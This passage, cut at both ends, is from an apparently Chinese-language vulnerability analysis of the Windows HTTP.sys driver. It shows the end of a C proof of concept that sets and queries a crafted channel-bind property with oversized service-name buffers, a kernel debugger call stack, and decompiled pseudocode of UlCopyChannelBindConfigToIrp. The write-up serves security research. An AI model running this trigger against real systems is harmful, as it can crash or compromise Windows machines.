style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 分配 0xfffffe0 大小的堆块</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> WCHAR<span style="color:#f92672">*</span>str<span style="color:#f92672">=</span><span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(),<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xfffffe0</span>);</span></span><span style="display:flex;"><span> WCHAR str_test[<span style="color:#ae81ff">0xfffe</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">L</span><span style="color:#e6db74">"192.168.52.133:8081"</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(str, str_test,<span style="color:#ae81ff">0x20</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> HTTP_CHANNEL_BIND_INFO bind_info;</span></span><span style="display:flex;"><span> bind_info.Hardening<span style="color:#f92672">=</span> HttpAuthenticationHardeningLegacy;</span></span><span style="display:flex;"><span> bind_info.Flags<span style="color:#f92672">=</span> HTTP_CHANNEL_BIND_PROXY;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> HTTP_SERVICE_BINDING_W service_binding;</span></span><span style="display:flex;"><span> HTTP_SERVICE_BINDING_BASE binding_base;</span></span><span style="display:flex;"><span> binding_base.Type<span style="color:#f92672">=</span> HttpServiceBindingTypeW;</span></span><span style="display:flex;"><span> service_binding.Base<span style="color:#f92672">=</span> binding_base;</span></span><span style="display:flex;"><span> service_binding.Buffer<span style="color:#f92672">=</span> str;</span></span><span style="display:flex;"><span> service_binding.BufferSize<span style="color:#f92672">=</span><span style="color:#ae81ff">0xfffffe0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0xf0f0f0</span>;<span style="color:#75715e">// F0F0EF0</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> PHTTP_SERVICE_BINDING_BASE binding_base_arr[<span style="color:#ae81ff">0x11</span>];</span></span><span style="display:flex;"><span> PHTTP_SERVICE_BINDING_BASE tmp_binding_base<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>service_binding;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x11</span>; i<span style="color:#f92672">++</span>) {</span></span><span style="display:flex;"><span> binding_base_arr[i]<span style="color:#f92672">=</span> tmp_binding_base;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> bind_info.ServiceNames<span style="color:#f92672">=</span> binding_base_arr;</span></span><span style="display:flex;"><span> bind_info.NumberOfServiceNames<span style="color:#f92672">=</span><span style="color:#ae81ff">0x11</span>;</span></span><span style="display:flex;"><span> retCode<span style="color:#f92672">=</span><span style="color:#a6e22e">HttpSetUrlGroupProperty</span>(urlGroupId, HttpServerChannelBindProperty,</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>bind_info,<span style="color:#ae81ff">0x20</span>);</span></span><span style="display:flex;"><span> retCode<span style="color:#f92672">=</span><span style="color:#a6e22e">HttpQueryUrlGroupProperty</span>(urlGroupId, HttpServerChannelBindProperty,</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>data_temp1,<span style="color:#ae81ff">0x140</span>,<span style="color:#f92672">&amp;</span>return_len);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>在<code>http!UlCopyChannelBindConfigToIrp</code> 下断点，运行PoC，此时调用栈为</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">1:</span><span style="color:#a6e22e">kd</span><span style="color:#f92672">></span> k</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">Child</span><span style="color:#f92672">-</span>SP RetAddr Call Site</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">00</span><span style="color:#a6e22e">fffff889</span><span style="color:#e6db74">`cd7f76a8 fffff805`</span><span style="color:#ae81ff">7981</span>ae19 HTTP<span style="color:#960050;background-color:#1e0010">!</span>UlCopyChannelBindConfigToIrp</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">01</span><span style="color:#a6e22e">fffff889</span><span style="color:#e6db74">`cd7f76b0 fffff805`</span><span style="color:#ae81ff">7982</span>caf5 HTTP<span style="color:#960050;background-color:#1e0010">!</span>UlQueryConfigGroupProperty<span style="color:#f92672">+</span><span style="color:#ae81ff">0x175</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">02</span><span style="color:#a6e22e">fffff889</span><span style="color:#e6db74">`cd7f7740 fffff805`</span><span style="color:#ae81ff">797130</span>aa HTTP<span style="color:#960050;background-color:#1e0010">!</span>UlQueryUrlGroupIoctl<span style="color:#f92672">+</span><span style="color:#ae81ff">0x195</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">03</span><span style="color:#a6e22e">fffff889</span><span style="color:#e6db74">`cd7f77c0 fffff805`</span><span style="color:#ae81ff">6</span>dc954d5 HTTP<span style="color:#960050;background-color:#1e0010">!</span>UxDeviceControl<span style="color:#f92672">+</span><span style="color:#ae81ff">0x8a</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">04</span><span style="color:#a6e22e">fffff889</span><span style="color:#e6db74">`cd7f7800 fffff805`</span><span style="color:#ae81ff">6</span>e0a6048 nt<span style="color:#960050;background-color:#1e0010">!</span>IofCallDriver<span style="color:#f92672">+</span><span style="color:#ae81ff">0x55</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">05</span><span style="color:#a6e22e">fffff889</span><span style="color:#e6db74">`cd7f7840 fffff805`</span><span style="color:#ae81ff">6</span>e0a5e47 nt<span style="color:#960050;background-color:#1e0010">!</span>IopSynchronousServiceTail<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1a8</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">06</span><span style="color:#a6e22e">fffff889</span><span style="color:#e6db74">`cd7f78e0 fffff805`</span><span style="color:#ae81ff">6</span>e0a51c6 nt<span style="color:#960050;background-color:#1e0010">!</span>IopXxxControlFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc67</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">07</span><span style="color:#a6e22e">fffff889</span><span style="color:#e6db74">`cd7f7a20 fffff805`</span><span style="color:#ae81ff">6</span>de0d8f5 nt<span style="color:#960050;background-color:#1e0010">!</span>NtDeviceIoControlFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0x56</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">08</span><span style="color:#a6e22e">fffff889</span><span style="color:#e6db74">`cd7f7a90 00007ff9`</span>c610d1a4 nt<span style="color:#960050;background-color:#1e0010">!</span>KiSystemServiceCopyEnd<span style="color:#f92672">+</span><span style="color:#ae81ff">0x25</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">09</span><span style="color:#960050;background-color:#1e0010">00000014`7</span><span style="color:#a6e22e">dcd6308</span><span style="color:#ae81ff">00007</span>ff9<span style="color:#960050;background-color:#1e0010">`</span>b6391b7a ntdll<span style="color:#960050;background-color:#1e0010">!</span>NtDeviceIoControlFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">a</span><span style="color:#ae81ff">00000014</span><span style="color:#e6db74">`7dcd6310 00007ff9`</span>b6393c9f HTTPAPI<span style="color:#960050;background-color:#1e0010">!</span>HttpApiSynchronousDeviceControl<span style="color:#f92672">+</span><span style="color:#ae81ff">0x8a</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">b</span><span style="color:#ae81ff">00000014</span><span style="color:#e6db74">`7dcd6390 00007ff6`</span><span style="color:#ae81ff">93</span>fb18b2 HTTPAPI<span style="color:#960050;background-color:#1e0010">!</span>HttpQueryUrlGroupProperty<span style="color:#f92672">+</span><span style="color:#ae81ff">0x6f</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">c</span><span style="color:#ae81ff">00000014</span><span style="color:#e6db74">`7dcd6410 00000000`</span><span style="color:#ae81ff">00000000</span> http_poc2<span style="color:#960050;background-color:#1e0010">!</span>wmain<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3d2</span> [D:<span style="color:#960050;background-color:#1e0010">\</span>code<span style="color:#960050;background-color:#1e0010">\</span>c<span style="color:#960050;background-color:#1e0010">\</span>http_poc2.c<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">113</span>]</span></span></code></pre></div><p><code>http!UlCopyChannelBindConfigToIrp</code> 伪代码如下，该函数调用<code>UxGetOutputBufferForOutDirect</code> 计算存储<code>ChannelBindConfig</code> 所需的内存大小，并和<code>UxGetOutputBufferForOutDirect</code>返回的分配的内存大小作比较：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">UlCopyChannelBindConfigToIrp</span>(<span style="color:#66d9ef">__int64</span> a1, IRP<span style="color:#f92672">*</span>a2,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>...</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#a6e22e">UlpComputeChannelBindConfigSize</span>(a1, a2);</span></span><span style="display:flex;"><span> v43<span style="color:#f92672">=</span> v8;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">IoIs32bitProcess</span>(a2) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v36<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">IoIs32bitProcess</span>(a2);</span></span><span style="display:flex;"><span> OutputBufferForOutDirect<span style="color:#f92672">=</span><span style="color:#a6e22e">UxGetOutputBufferForOutDirect</span>(</span></span><span style="display:flex;"><span> (_DWORD)a2,</span></span><span style="display:flex;"><span> (_DWORD)CurrentStackLocation,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16</span>,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v31,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v32,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v41);</span></span><span style="display:flex;"><span> v33<span style="color:#f92672">=</span> OutputBufferForOutDirect;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( OutputBufferForOutDirect<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8<span style="color:#f92672">></span> v41 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> OutputBufferForOutDirect<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2147483643</span>;</span></span><span style="display:flex;"><span> v33<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2147483643</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (WPP_MAIN_CB.StackSize<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span><span style="color:#ae81ff">43</span>i64;</span></span><span style="display:flex;"><span>LABEL_6:</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WPP_SF_D</span>(v10,<span style="color:#f92672">&amp;</span>WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids,<span style="color:#ae81ff">2147483653</span>i64);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> v31;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)a1<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v31<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v11<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v31<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v11<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v11<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v12<span style="color:#f92672">||</span><span style="color:#f92672">!*</span>(_DWORD<span style="color:#f92672">*</span>)(v12<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span> (v11<span style="color:#f92672">+</span><span style="color:#ae81ff">19</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFFFFFFFFFCu</span>i64;</span></span><span style="display:flex;"><span> v38<span style="color:#f92672">=</span> v13;</span></span><span style="display:flex;"><span> v36<span style="color:#f92672">=</span> (_DWORD<span style="color:#f92672">*</span>)v13;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v11<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span> v13<span style="color:#f92672">+</span> v32<span style="color:#f92672">-</span> v31;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v11<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>i64);</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>i64);</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span> (_DWORD<span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span> v14);</span></span><span style="display:flex;"><span> v37<span style="color:#f92672">=</span> v15;</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v15[<span style="color:#ae81ff">3</span><span style="color:#f92672">*</span> v14];</span></span><span style="display:flex;"><span> v35<span style="color:#f92672">=</span> v16;</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v34<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v17<span style="color:#f92672">&lt;</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>i64<span style="color:#f92672">*</span> v17)<span style="color:#f92672">=</span> (_DWORD)v15<span style="color:#f92672">+</span> v32<span style="color:#f92672">-</span> v31;</span></span><span style="display:flex;"><span> v18<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>i64)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>i64<span style="color:#f92672">*</span> v17);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v18<span style="color:#f92672">==</span><span style="color:#ae81ff">2</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v36<span style="color:#f92672">=</span> v15<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>;</span></span><span style="display:flex;"><span> v37<span style="color:#f92672">=</span> v15<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v15<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> v15[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span> (_DWORD)v16<span style="color:#f92672">+</span> v32<span style="color:#f92672">-</span> v31;</span></span><span style="display:flex;"><span> v15[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v18<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memmove</span>(v16,<span style="color:#f92672">*</span>(<span style="color:#66d9ef">const</span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)(v18<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>),<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v18<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>));</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>v35[<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v18<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)];</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v36<span style="color:#f92672">=</span> v15<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>;</span></span><span style="display:flex;"><span> v37<span style="color:#f92672">=</span> v15<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v15<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> v30<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(v16<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFFFFFFFFFEu</span>i64);</span></span><span style="display:flex;"><span> v15[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span> (_DWORD)v30<span style="color:#f92672">+</span> v32<span style="color:#f92672">-</span> v31;</span></span><span style="display:flex;"><span> v15[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v18<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memmove</span>(v30,<span style="color:#f92672">*</span>(<span style="color:#66d9ef">const</span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)(v18<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>),<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v18<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>));</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>v30[<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v18<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)];</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v35<span style="color:#f92672">=</span> v16;</span></span><span style="display:flex;"><span> v34<span style="color:#f92672">=</span><span style="color:#f92672">++</span>v17;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span> v36;</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span> v38;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>LABEL_31:</span></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span> v42;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v38<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">=</span><span style="color:#a6e22e">IoIs32bitProcess</span>(a2);</span></span><span style="display:flex;"><span> OutputBufferForOutDirect<span style="color:#f92672">=</span><span style="color:#a6e22e">UxGetOutputBufferForOutDirect</span>(</span></span><span style="display:flex;"><span> (_DWORD)a2,</span></span><span style="display:flex;"><span> (_DWORD)CurrentStackLocation,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">24</span>,</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">?</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v31,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v32,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v41);</span></span><span style="display:flex;"><span> v33<span style="color:#f92672">=</span> OutputBufferForOutDirect;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( OutputBufferForOutDirect<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8<span style="color:#f92672">></span> v41 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> OutputBufferForOutDirect<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2147483643</span>;</span></span><span style="display:flex;"><span> v33<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2147483643</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (WPP_MAIN_CB.StackSize<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span><span style="color:#ae81ff">44</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_6;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v21<span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v21<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v26<span style="color:#f92672">&lt;</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v22<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>i64<span style="color:#f92672">*</span> v26)<span style="color:#f92672">=</span> v32<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v24<span style="color:#f92672">-</span> v31);</span></span><span style="display:flex;"><span> v27<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>i64)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>i64<span style="color:#f92672">*</span> v26);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v27<span style="color:#f92672">==</span><span style="color:#ae81ff">2</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v36<span style="color:#f92672">=</span> (_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>);</span></span><span style="display:flex;"><span> v37<span style="color:#f92672">=</span> (_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v24<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span> v32<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)((_DWORD)v25<span style="color:#f92672">-</span> v31);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v27<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memmove</span>(v25,<span style="color:#f92672">*</span>(<span style="color:#66d9ef">const</span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)(v27<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>),<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v27<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>));</span></span><span style="display:flex;"><span> 